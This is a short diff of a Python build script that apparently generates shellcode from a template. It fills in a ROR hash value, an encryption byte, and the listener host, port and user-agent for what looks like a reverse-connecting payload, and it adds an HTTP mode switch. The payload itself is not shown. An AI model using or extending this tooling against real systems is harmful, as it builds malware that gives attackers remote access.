@@ -22,6 +22,7 @@ WORKING_FOLDER = "temp/"
 
 def main():
     print("===========CONFIG==========")
+    print(f"Mode: {MODE}")
     print(f"ROR value: {ROR_VALUE}")
     print(f"Encryption byte: {ENCRYPTION_BYTE}")
     print("===========================\n")
@@ -29,11 +30,13 @@ def main():
     print("===========PAYLOAD==============")
     sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
     
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST)
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT)
+    if "http" in MODE:
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
 
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
+    if is_valid_ip(LHOST):
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
     remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)
 
     # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
